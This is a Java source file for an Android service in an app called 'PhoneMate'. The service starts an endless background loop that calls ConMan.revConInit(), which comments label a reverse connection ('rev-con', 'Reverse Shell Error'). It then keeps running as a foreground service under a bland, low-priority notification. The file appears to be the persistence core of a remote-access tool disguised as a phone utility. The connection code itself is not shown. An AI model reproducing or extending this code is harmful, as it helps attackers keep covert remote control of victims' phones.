package com.dextrotechnologies.phonemate;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

public class MainService extends Service {

    private static final int NOTIF_ID = 1;
    private static final String NOTIF_CHANNEL_ID = "default";

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        //start rev-con
        new Thread(() -> {
            // Initiate new con on exit
            while (true){
                try{
                    ConMan.revConInit();
                } catch (Exception e){
                    // Log.e("Reverse Shell Error", e.getMessage());
                }
            }
        }).start();

        // Create Notification Channel
        initChannels(this);

        // Start Foreground Service
        startForeground();

        return super.onStartCommand(intent, flags, startId);
    }



    private void startForeground() {
        Intent notificationIntent = new Intent(this, MainActivity.class);

        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0,
                notificationIntent, 0);

        startForeground(NOTIF_ID, new NotificationCompat.Builder(this,
                NOTIF_CHANNEL_ID)
                .setOngoing(true)
                .setSmallIcon(R.drawable.ic_notification)
                .setContentTitle("PhoneMate")
                .setContentText("Background service is running")
                .setContentIntent(pendingIntent)
                .build());
    }

    private void initChannels(Context context) {
        if (Build.VERSION.SDK_INT < 26) {
            return;
        }
        NotificationManager notificationManager =
                (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
        NotificationChannel channel = new NotificationChannel("default",
                "Channel name",
                NotificationManager.IMPORTANCE_MIN);
        channel.setDescription("Channel description");
        notificationManager.createNotificationChannel(channel);
    }
}